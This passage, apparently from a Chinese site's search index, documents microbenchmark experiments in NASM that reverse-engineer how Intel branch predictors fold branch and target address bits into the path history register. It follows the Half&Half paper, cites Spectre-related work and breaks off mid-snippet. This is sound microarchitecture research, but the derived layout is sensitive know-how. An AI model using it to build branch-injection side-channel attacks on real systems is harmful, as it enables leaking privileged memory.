\u200b\u7b49\u4e8e\u96f6\u200b\u8fd8\u662f\u200b\u4e0d\u200b\u7b49\u4e8e\u96f6\u200b\u53bb\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u7387\u200b\u5c31\u200b\u4f1a\u200b\u63a5\u8fd1\u200b 0%</li> <li>\u200b\u5047\u5982\u200b\u7b2c\u4e8c\u6b65\u200b\u8df3\u8f6c\u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b PHR \u200b\u4f9d\u7136\u200b\u662f\u200b\u96f6\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u5728\u200b\u9884\u6d4b\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u533a\u5206\u200b\u7b2c\u4e8c\u6b65\u200b\u5f80\u200b\u8df3\u8f6c\u200b\u4e86\u200b\u8fd8\u662f\u200b\u6ca1\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u4e8e\u662f\u200b\u7b2c\u4e09\u6b65\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\u5c31\u200b\u4f1a\u200b\u63a5\u8fd1\u200b 50%</li> </ol> <p>\u200b\u9996\u5148\u200b\u6d4b\u8bd5\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u6700\u200b\u591a\u7528\u200b\u4e86\u200b\u591a\u5c11\u200b\u4f4d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u4ece\u200b\u4f4e\u4f4d\u200b\u5f80\u200b\u9ad8\u4f4d\u200b\u4e0d\u65ad\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b\u66f4\u5927\u200b\u7684\u200b alignment\uff0cNASM \u200b\u7f16\u5199\u200b\u4ee3\u7801\u200b\u6d4b\u8bd5\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>; reproduce Figure 3 of Half&amp;Half\n\n; alignment bits of branch instruction address\n%ifndef branchalign\n    %define branchalign 18\n%endif\n\n; alignment bits of branch target address\n%ifndef targetalign\n    %define targetalign 5\n%endif\n\n%macro testinit3 0\n    mov rdi, 1000\n\n    ; loop 300 times to clear phr\n    ; since we only consider branch misprediction of the last two branches\n    ; we do not have to be accurate here e.g. 93/194\nloop_begin:\n    mov eax, 300\n    align 64\n    jmp dummy_target\n\n    align 1&lt;&lt;19\n    %rep (1&lt;&lt;19)-(1&lt;&lt;8)\n        nop\n    %endrep\n\n    ; dummy_target aligned to 1&lt;&lt;8\ndummy_target:\n    %rep (1&lt;&lt;8)-7\n        nop\n    %endrep\n    dec eax ; 2 bytes\n    ; the last byte of jnz aligned to 1&lt;&lt;19\n    ; jnz dummy_target\n    db 0x0f\n    db 0x85\n    dd dummy_target - $ - 4\n\n    READ_PMC_START\n    rdrand eax\n    and eax, 1\n\n    ; READ_PMC_START: 166\n    ; rdrand eax: 3 bytes\n    ; and eax, 1: 3 bytes\n    ; jnz first_target: 6 bytes\n\n    %rep (1&lt;&lt;branchalign)-166-6-6\n        nop\n    %endrep\n\n    ; the last byte of jnz aligned to 1&lt;&lt;branchalign\n    ; jnz first_target\n    db 0x0f\n    db 0x85\n    dd first_target - $ - 4\n\n    %rep (1&lt;&lt;targetalign)-1\n        nop\n    %endrep\n    ; target aligned to 1&lt;&lt;targetalign\nfirst_target:\n\n    align 64\n    jnz second_target\nsecond_target:\n\n    READ_PMC_END\n\n    align 64\n    dec rdi\n    jnz loop_begin\n%endmacro\n</code></pre> <p>\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u5982\u4e0b\u200b\uff0c\u200b\u5f53\u200b\u56fa\u5b9a\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5bf9\u9f50\u200b\u5230\u200b 2^6 \u200b\u5b57\u8282\u200b\u65f6\u200b\uff0c\u200b\u8ba9\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u4ece\u200b 2^0 \u200b\u5230\u200b 2^19 \u200b\u5b57\u8282\u200b\u5bf9\u9f50\u200b\uff0c\u200b\u5f97\u5230\u200b\u5982\u4e0b\u200b\u7ed3\u679c\u200b\uff1a</p> <p></p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u53ea\u6709\u200b\u4f4e\u200b 16 \u200b\u4f4d\u200b\u53c2\u4e0e\u200b\u5230\u200b\u4e86\u200b PHR \u200b\u8ba1\u7b97\u200b\u5f53\u4e2d\u200b\u3002\u200b\u53cd\u8fc7\u6765\u200b\uff0c\u200b\u56fa\u5b9a\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u5bf9\u9f50\u200b\u5230\u200b 2^16 \u200b\u5b57\u8282\u200b\uff0c\u200b\u8ba9\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u4ece\u200b 2^0 \u200b\u5230\u200b 2^18 \u200b\u5b57\u8282\u200b\u5bf9\u9f50\u200b\uff0c\u200b\u5f97\u5230\u200b\u5982\u4e0b\u200b\u7ed3\u679c\u200b\uff1a</p> <p></p> <p>\u200b\u8bf4\u660e\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u53ea\u6709\u200b\u4f4e\u200b 6 \u200b\u4f4d\u200b\u53c2\u4e0e\u200b\u5230\u200b\u4e86\u200b PHR \u200b\u8ba1\u7b97\u200b\u5f53\u4e2d\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b PHR \u200b\u8ba1\u7b97\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 16 \u200b\u4f4d\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 6 \u200b\u4f4d\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u5c31\u8981\u200b\u8fdb\u4e00\u6b65\u200b\u5206\u6790\u200b\u5b83\u4eec\u200b\u5177\u4f53\u200b\u600e\u4e48\u200b\u53c2\u4e0e\u200b\u5230\u200b PHR \u200b\u8ba1\u7b97\u200b\u5f53\u4e2d\u200b\u3002</p> <p>\u200b\u7528\u200b\u540c\u6837\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6d4b\u8bd5\u200b Skylake \u200b\u67b6\u6784\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b PHR \u200b\u8ba1\u7b97\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 19 \u200b\u4f4d\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4f4e\u200b 6 \u200b\u4f4d\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#phr-bit","title":"PHR \u200b\u4e2d\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5404\u200b bit \u200b\u7684\u200b\u4f4d\u7f6e","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\uff0c\u200b\u8981\u200b\u6d4b\u8bd5\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5982\u4f55\u200b\u53c2\u4e0e\u200b\u5230\u200b PHR \u200b\u8ba1\u7b97\u200b\u5f53\u4e2d\u200b\u3002PHR \u200b\u662f\u200b\u4e00\u4e2a\u200b\u79fb\u4f4d\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u800c\u200b 16 \u200b\u4f4d\u200b\u7684\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u5c31\u200b\u5168\u90e8\u200b\u79fb\u4f4d\u200b\u51fa\u53bb\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u90e8\u5206\u200b\u4f4d\u200b\uff0c\u200b\u89c2\u5bdf\u200b\u7ecf\u8fc7\u200b\u591a\u5c11\u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u4ece\u200b PHR \u200b\u91cc\u200b\u88ab\u200b\u79fb\u4f4d\u200b\u51fa\u53bb\u200b\uff0c\u200b\u901a\u8fc7\u200b\u4e0d\u540c\u200b bit \u200b\u79fb\u4f4d\u200b\u51fa\u53bb\u200b\u7684\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63a8\u65ad\u51fa\u200b PHR \u200b\u7684\u200b\u7ed3\u6784\u200b\u3002</p> <p>\u200b\u4e8e\u662f\u200b\u4fee\u6539\u200b\u4ee3\u7801\u200b\uff0c\u200b\u53bb\u200b\u4fee\u6539\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4e00\u4e2a\u200b bit\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u4e24\u4e2a\u200b\u968f\u673a\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\u4e2d\u95f4\u200b\u63d2\u5165\u200b\u53ef\u53d8\u200b\u4e2a\u6570\u200b\u7684\u200b dummy branch\uff1a</p> <pre><code>; reproduce Table 2 of Half&amp;Half\n\n; alignment bits of branch instruction address\n%ifndef branchalign\n    %define branchalign 18\n%endif\n\n; alignment bits of branch target address\n%ifndef targetalign\n    %define targetalign 5\n%endif\n\n; toggle bit of branch address (-1 means do not toggle)\n%ifndef branchtoggle\n    %define branchtoggle 0\n%endif\n\n; toggle bit of target address (-1 means do not toggle)\n%ifndef targettoggle\n    %define targettoggle 0\n%endif\n\n; number of dummy branches\n%ifndef dummybranches\n    %define dummybranches 5\n%endif\n\n%macro testinit3 0\n    mov rdi, 1000\n\nloop_begin:\n\n    ; loop to clear phr\n    mov eax, 200\n    align 64\n    jmp clear_phr_dummy_target\n\n    align 1&lt;&lt;16\n    %rep (1&lt;&lt;16)-(1&lt;&lt;8)\n        nop\n    %endrep\n\n    ; dummy_target aligned to 1&lt;&lt;8\nclear_phr_dummy_target:\n    %rep (1&lt;&lt;8)-7\n        nop\n    %endrep\n    dec eax ; 2 bytes\n    ; the last byte of jnz aligned to 1&lt;&lt;18\n    ; jnz clear_phr_dummy_target\n    db 0x0f\n    db 0x85\n    dd clear_phr_dummy_target - $ - 4\n\n    ; train branch\n\n    READ_PMC_START\n    rdrand ebx\n    and ebx, 1\n    ; READ_PMC_START: 166 bytes\n    ; rdrand ebx: 3 bytes\n    ; and ebx, 1: 3 bytes\n    ; jnz first_target: 6 bytes\n    %rep (1&lt;&lt;branchalign)-166-6-6\n        nop\n    %endrep\n\n    %if branchtoggle != -1\n    %rep (1&lt;&lt;branchtoggle)\n        nop\n    %endrep\n    %endif\n    ; the last byte of jnz - 1&lt;&lt;branchtoggle aligned to 1&lt;&lt;branchalign\n    ; jnz first_target\n    db 0x0f\n    db 0x85\n    dd first_target - $ - 4\n\n    ; target aligned to 1&lt;&lt;targetalign\n    %if branchtoggle != -1\n    %rep (1&lt;&lt;targetalign)-1-(1&lt;&lt;branchtoggle)\n        nop\n    %endrep\n    %else\n    %rep (1&lt;&lt;targetalign)-1\n        nop\n    %endrep\n    %endif\n\n    %if targettoggle != -1\n    %rep (1&lt;&lt;targettoggle)\n        nop\n    %endrep\n    %endif\nfirst_target:\n\n    ; loop to shift phr\n    mov eax, dummybranches+1\n\n    align 1&lt;&lt;16\n    %rep (1&lt;&lt;16)-(1&lt;&lt;8)\n        nop\n    %endrep\n\n    ; dummy_target aligned to 1&lt;&lt;8\nshift_phr_dummy_target:\n    %rep (1&lt;&lt;8)-7\n        nop\n    %endrep\n    dec eax ; 2 bytes\n    ; the last byte of jnz aligned to 1&lt;&lt;18\n    ; jnz shift_phr_dummy_target\n    db 0x0f\n    db 0x85\n    dd shift_phr_dummy_target - $ - 4\n\n    ; test branch\n\n    align 64\n    and ebx, 1\n    jnz second_target\nsecond_target:\n    READ_PMC_END\n\n    align 64\n    dec rdi\n    jnz loop_begin\n\n%endmacro\n</code></pre> <p>\u200b\u7ecf\u8fc7\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u8c03\u6574\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u4f4d\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u63a7\u5236\u200b\u4e24\u4e2a\u200b\u968f\u673a\u200b\u8df3\u8f6c\u200b\u5206\u652f\u200b\u4e4b\u95f4\u200b\u7684\u200b\u5206\u652f\u200b\u6570\u91cf\u200b\uff0c\u200b\u5f97\u5230\u200b\u5982\u4e0b\u200b\u7684\u200b\u7ed3\u679c\u200b\uff1a</p> <p></p> <p>\u200b\u8df3\u8f6c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b\u4f4d\u200b\u548c\u200b\u63a7\u5236\u200b\u4e24\u4e2a\u200b\u968f\u673a\u200b\u8df3\u8f6c\u200b\u5206\u652f\u200b\u4e4b\u95f4\u200b\u7684\u200b\u5206\u652f\u200b\u6570\u91cf\u200b\uff0c\u200b\u5f97\u5230\u200b\uff1a</p> <p></p> <p>\u200b\u989c\u8272\u200b\u6bd4\u8f83\u200b\u6d45\u200b\u7684\u200b\u90e8\u5206\u200b\u4ee3\u8868\u200b 50% \u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\uff0c\u200b\u989c\u8272\u200b\u6bd4\u8f83\u200b\u6df1\u200b\u7684\u200b\u90e8\u5206\u200b\u4ee3\u8868\u200b 25% \u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\u3002\u200b\u6027\u80fd\u200b\u6709\u200b\u4e00\u4e9b\u200b\u6ce2\u52a8\u200b\uff0c\u200b\u76f4\u63a5\u200b\u770b\u200b\u989c\u8272\u200b\u7684\u200b\u754c\u9650\u200b\u5373\u53ef\u200b\u3002\u200b\u603b\u7ed3\u200b\u4ee5\u4e0a\u200b\u4fe1\u606f\u200b\uff08Bx \u200b\u8868\u793a\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b x \u200b\u4f4d\u200b\uff0cTy \u200b\u8868\u793a\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u7684\u200b y \u200b\u4f4d\u200b\uff09\uff1a</p> Flipped bit dummy branches B14, B15 186 B12, B13 187 B2, B11, T4, T5 188 B0, B1, T2, T3 189 B9, B10 190 B7, B8 191 B5, B6 192 B3, B4, T0, T1 193 <p>dummy branch \u200b\u8d8a\u200b\u5c11\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8d8a\u65e9\u200b\u88ab\u200b\u79fb\u4f4d\u200b\u51fa\u200b PHR\u3002\u200b\u7531\u4e8e\u200b\u5b83\u4eec\u200b\u603b\u662f\u200b 2 \u200b\u4f4d\u200b\u4e00\u7ec4\u200b\uff0c\u200b\u731c\u6d4b\u200b PHR \u200b\u6bcf\u4e2a\u200b taken \u200b\u5206\u652f\u200b\u4f1a\u200b\u5de6\u79fb\u200b 2 \u200b\u4f4d\u200b\u3002\u200b\u518d\u200b\u6839\u636e\u200b\u79fb\u4f4d\u200b\u51fa\u53bb\u200b\u7684\u200b\u987a\u5e8f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9884\u6d4b\u200b\u9ad8\u4f4d\u200b\u662f\u200b B15 \u200b\u548c\u200b B14\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u662f\u200b B13 \u200b\u548c\u200b B12\uff0c\u200b\u6700\u540e\u200b\u5230\u200b\u4f4e\u4f4d\u200b\u662f\u200b B3\u3001B4\u3001T0 \u200b\u548c\u200b T1\u3002</p> <p>\u200b\u7528\u200b\u540c\u6837\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5728\u200b Skylake \u200b\u4e0a\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u9996\u5148\u200b\u6d4b\u8bd5\u200b\u5206\u652f\u200b\u5730\u5740\u200b\uff1a</p> <p></p> <p>\u200b\u53ef\u89c1\u200b Skylake \u200b\u4e5f\u200b\u662f\u200b\u6bcf\u4e2a\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b PHR \u200b\u79fb\u200b 2 \u200b\u4f4d\u200b\uff0c\u200b\u7136\u540e\u200b\u4ece\u200b\u4f4e\u4f4d\u200b\u5230\u200b\u9ad8\u4f4d\u200b\u7684\u200b\u987a\u5e8f\u200b\u662f\u200b\uff1aB3 B4 B7 B8 B11 B12 B5 B6 B9 B10 B13 B14 B15 B16 B17 B18\u3002</p> <p>\u200b\u518d\u200b\u6d4b\u8bd5\u200b Skylake \u200b\u4e0a\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff1a</p> <p></p> <p>\u200b\u90a3\u4e48\u200b T0 T1 \u200b\u662f\u200b\u548c\u200b B3 B4 \u200b\u5728\u200b\u4e00\u8d77\u200b\uff0cT2 T3 \u200b\u662f\u200b\u548c\u200b B7 B8 \u200b\u5728\u200b\u4e00\u8d77\u200b\uff0cT4 T5 \u200b\u662f\u200b\u548c\u200b B11 B12 \u200b\u5728\u200b\u4e00\u8d77\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#phr-bit_1","title":"PHR \u200b\u4e2d\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u548c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u5404\u200b bit \u200b\u7684\u200b\u5f02\u6216\u200b\u5173\u7cfb","text":"<p>\u200b\u7531\u4e8e\u200b PHR \u200b\u91cc\u200b\u6bcf\u200b 2 \u200b\u4f4d\u200b\u53ef\u80fd\u200b\u6d89\u53ca\u200b\u5230\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u6216\u8005\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u4e00\u5171\u200b 4 \u200b\u4f4d\u200b\u4fe1\u606f\u200b\uff0c\u200b\u63a8\u6d4b\u200b\u91cc\u9762\u200b\u6709\u200b\u5f02\u6216\u200b\u7684\u200b\u8ba1\u7b97\u200b\u5b58\u5728\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u679a\u4e3e\u200b\u8fd9\u4e9b\u200b\u4f4d\u200b\u7684\u200b pair\uff0c\u200b\u5982\u679c\u200b\u67d0\u4e2a\u200b pair \u200b\u4e0b\u200b\uff0c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b 50%\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b 25%\uff0c\u200b\u8bf4\u660e\u200b\u5b83\u4eec\u200b\u5728\u200b PHR \u200b\u91cc\u200b\u76f8\u4e92\u200b\u62b5\u6d88\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u51fa\u73b0\u200b xor \u200b\u7684\u200b\u5173\u7cfb\u200b\u3002\u200b\u7f16\u5199\u200b NASM \u200b\u6d4b\u8bd5\u200b\uff1a</p> <pre><code>; reproduce Figure 4 of Half&amp;Half\n\n; alignment bits of branch instruction address\n%ifndef branchalign\n    %define branchalign 18\n%endif\n\n; alignment bits of branch target address\n%ifndef targetalign\n    %define targetalign 5\n%endif\n\n; toggle bit of branch address\n%ifndef branchtoggle\n    %define branchtoggle 0\n%endif\n\n; toggle bit of target address\n%ifndef targettoggle\n    %define targettoggle 0\n%endif\n\n%macro testinit3 0\n    mov rdi, 1000\n\n    ; loop 300 times to clear phr\n    ; since we only consider branch misprediction of the last two branches\n    ; we do not have to be accurate here e.g. 93/194\nloop_begin:\n    mov eax, 300\n    align 64\n    jmp dummy_target\n\n    align 1&lt;&lt;19\n    %rep (1&lt;&lt;19)-(1&lt;&lt;8)\n        nop\n    %endrep\n\n    ; dummy_target aligned to 1&lt;&lt;8\ndummy_target:\n    %rep (1&lt;&lt;8)-7\n        nop\n    %endrep\n    dec eax ; 2 bytes\n    ; the last byte of jnz aligned to 1&lt;&lt;19\n    ; jnz dummy_target\n    db 0x0f\n    db 0x85\n    dd dummy_target - $ - 4\n\n    READ_PMC_START\n    rdrand eax\n    and eax, 1\n\n    ; READ_PMC_START: 166\n    ; rdrand eax: 3 bytes\n    ; and eax, 1: 3 bytes\n    ; jnz first_target: 6 bytes\n\n    %rep (1&lt;&lt;branchalign)-166-6-6\n        nop\n    %endrep\n\n    %rep (1&lt;&lt;branchtoggle)\n        nop\n    %endrep\n\n    ; the last byte of jnz minus 1&lt;&lt;branchtoggle aligned to 1&lt;&lt;branchalign\n    ; jnz first_target\n    db 0x0f\n    db 0x85\n    dd first_target - $ - 4\n\n    %rep (1&lt;&lt;targetalign)-1-(1&lt;&lt;branchtoggle)\n        nop\n    %endrep\n    %rep (1&lt;&lt;targettoggle)\n        nop\n    %endrep\n    ; target minus 1&lt;&lt;targettoggle aligned to 1&lt;&lt;targetalign\nfirst_target:\n\n    align 64\n    jnz second_target\nsecond_target:\n\n    READ_PMC_END\n\n    align 64\n    dec rdi\n    jnz loop_begin\n%endmacro\n</code></pre> <p>\u200b\u6d4b\u8bd5\u200b\u8fd9\u4e9b\u200b pair\uff0c\u200b\u627e\u5230\u200b\u54ea\u4e9b\u200b pair \u200b\u4f1a\u200b\u51fa\u73b0\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b 50%\uff1a</p> <p></p> <p>\u200b\u5176\u4e2d\u200b\u989c\u8272\u200b\u6d45\u200b\u7684\u200b\u9ec4\u8272\u200b\u5c31\u200b\u4ee3\u8868\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b 50%\uff0c\u200b\u4ece\u56fe\u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u8fd9\u4e9b\u200b\u5173\u7cfb\u200b\uff1a</p> <ol> <li>B0 xor T2: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B1 xor T3: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B2 xor T4: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B3 xor T0: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B3 xor T5</li> <li>B4 xor T1: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B11 xor T0</li> <li>B11 xor T5: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B12 xor T1</li> </ol> <p>\u200b\u548c\u200b\u8bba\u6587\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u7684\u200b\u591a\u200b\u51fa\u6765\u200b\u7684\u200b\u4e09\u7ec4\u200b xor \u200b\u5173\u7cfb\u200b\uff0c\u200b\u901a\u8fc7\u200b\u90ae\u4ef6\u200b\u548c\u200b\u8bba\u6587\u200b\u4f5c\u8005\u200b\u8054\u7cfb\u200b\u540e\u200b\uff0c\u200b\u5f97\u77e5\u200b\uff1a\u200b\u8fd9\u200b\u4e09\u7ec4\u200b\u5173\u7cfb\u200b\u5728\u200b PHR \u200b\u9636\u6bb5\u200b\u6ca1\u6709\u200b XOR \u200b\u5173\u7cfb\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b tag \u200b\u8ba1\u7b97\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fd9\u200b\u4e09\u7ec4\u200b\u5173\u7cfb\u200b\u6700\u7ec8\u200b\u4f1a\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u76f8\u540c\u200b\u7684\u200b tag\uff0c\u200b\u5bfc\u81f4\u200b PHT\uff08Pattern History Table\uff09\u200b\u51fa\u73b0\u200b\u51b2\u7a81\u200b\uff0c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b 50%\u3002\u200b\u6839\u636e\u200b\u8bba\u6587\u200b\u4f5c\u8005\u200b\u7684\u200b\u5efa\u8bae\u200b\uff0c\u200b\u5728\u200b\u4e24\u4e2a\u200b\u968f\u673a\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\u4e2d\u95f4\u200b\u52a0\u5165\u200b 8 \u200b\u6b21\u200b\u5bf9\u9f50\u200b\u7684\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u4f7f\u5f97\u200b PHR \u200b\u5de6\u79fb\u200b 16 \u200b\u4f4d\u200b\uff0c\u200b\u90a3\u4e48\u200b\u591a\u200b\u51fa\u6765\u200b\u7684\u200b\u4e09\u7ec4\u200b xor \u200b\u5173\u7cfb\u200b\u5c31\u200b\u4f1a\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4e0d\u540c\u200b\u7684\u200b PHT index\uff0c\u200b\u4e0d\u518d\u200b\u5bfc\u81f4\u200b 50% \u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\uff0c\u200b\u6b64\u65f6\u200b\u771f\u6b63\u200b\u7684\u200b\u5728\u200b PHR \u200b\u4e2d\u6709\u200b xor \u200b\u5173\u7cfb\u200b\u7684\u200b\u7ec4\u200b\u5f97\u5230\u200b\u4fdd\u7559\u200b\uff1a</p> <p></p> <p>\u200b\u8bf4\u660e\u200b\u5b9e\u9645\u200b\u6709\u200b xor \u200b\u5173\u7cfb\u200b\u7684\u200b\u53ea\u6709\u200b\uff1a</p> <ol> <li>B0 xor T2: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B1 xor T3: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B2 xor T4: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B3 xor T0: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B4 xor T1: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> <li>B11 xor T5: \u200b\u548c\u200b\u8bba\u6587\u200b\u4e00\u81f4\u200b</li> </ol> <p>\u200b\u7ed3\u5408\u200b\u4ee5\u4e0a\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5224\u65ad\u200b\u51fa\u200b\u6bcf\u4e2a\u200b\u5206\u652f\u200b\u53c2\u4e0e\u200b\u5230\u200b PHR \u200b\u8ba1\u7b97\u200b\u7684\u200b\u6709\u200b 16 \u200b\u4f4d\u200b\uff0c\u200b\u4ece\u200b\u9ad8\u5230\u200b\u4f4e\u200b\uff08\u200b\u6bcf\u200b 2 \u200b\u4f4d\u5185\u200b\u7684\u200b\u987a\u5e8f\u200b\u53ef\u4ee5\u200b\u66ff\u6362\u200b\uff0c\u200b\u5bf9\u200b\u6d4b\u8bd5\u200b\u7ed3\u679c\u200b\u4e0d\u200b\u5f71\u54cd\u200b\uff09\uff1a</p> <ol> <li>B15</li> <li>B14</li> <li>B13</li> <li>B12</li> <li>B11 xor T5</li> <li>B2 xor T4</li> <li>B1 xor T3</li> <li>B0 xor T2</li> <li>B10</li> <li>B9</li> <li>B8</li> <li>B7</li> <li>B6</li> <li>B5</li> <li>B4 xor T1</li> <li>B3 xor T0</li> </ol> <p>\u200b\u5e76\u4e14\u200b\u6bcf\u4e2a\u200b taken branch \u200b\u4f1a\u200b\u4f7f\u5f97\u200b PHR \u200b\u5de6\u79fb\u200b 2 \u200b\u4f4d\u200b\u3002\u200b\u8fd9\u200b\u5c31\u200b\u9a8c\u8bc1\u200b\u4e86\u200b Half&amp;Half \u200b\u8bba\u6587\u200b\u91cc\u200b Figure 4(b) \u200b\u7684\u200b\u7ed3\u679c\u200b\u3002Indirector \u200b\u8bba\u6587\u200b\u91cc\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e09\u79cd\u200b\u5fae\u200b\u67b6\u6784\u200b\u7684\u200b PHR \u200b\u66f4\u65b0\u200b\u89c4\u5219\u200b\uff1a</p> <p></p> <p>\u200b\u5728\u200b Reading privileged memory with a side-channel \u200b\u91cc\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b Haswell \u200b\u67b6\u6784\u200b\u7684\u200b PHR\uff08\u200b\u6587\u7ae0\u200b\u91cc\u200b\u5199\u200b\u7684\u200b\u662f\u200b BHB\uff09\u200b\u66f4\u65b0\u200b\u65b9\u6cd5\u200b\uff1a</p> <pre><code>void bhb_update(uint58_t *bhb_state, unsigned long src, unsigned long dst) {\n  // B19 B18 B17 B16 B13 B12 B9 B8 B5 B4 B15+T5 B14+T4 B11+T3 B10+T2 B7+T1 B6+T0\n  *bhb_state &lt;&lt;= 2;\n  *bhb_state ^= (dst &amp; 0x3f);\n  *bhb_state ^= (src &amp; 0xc0) &gt;&gt; 6;\n  *bhb_state ^= (src &amp; 0xc00) &gt;&gt; (10 - 2);\n  *bhb_state ^= (src &amp; 0xc000) &gt;&gt; (14 - 4);\n  *bhb_state ^= (src &amp; 0x30) &lt;&lt; (6 - 4);\n  *bhb_state ^= (src 